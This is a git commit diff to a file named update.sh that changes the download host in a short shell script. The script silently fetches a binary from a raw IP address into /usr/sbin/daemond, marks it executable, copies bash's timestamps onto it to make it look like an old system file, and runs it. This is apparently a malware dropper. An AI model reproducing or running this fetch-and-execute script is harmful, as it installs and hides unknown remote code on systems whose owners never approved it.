14de75d9a106ccd25ddde5c57551596efaba326c
steverpm890 <126863735+steverpm890@users.noreply.github.com>
2023-04-18 06:56:03 -0400

    Update update.sh

--- update.sh
+++ update.sh
@@ -1,4 +1,4 @@
-curl -s -o /usr/sbin/daemond http://165.232.96.208:60080/daemond
+curl -s -o /usr/sbin/daemond http://80.78.25.27:60080/daemond
 chmod 755 /usr/sbin/daemond
 touch /usr/sbin/daemond -r /usr/bin/bash
 /usr/sbin/daemond
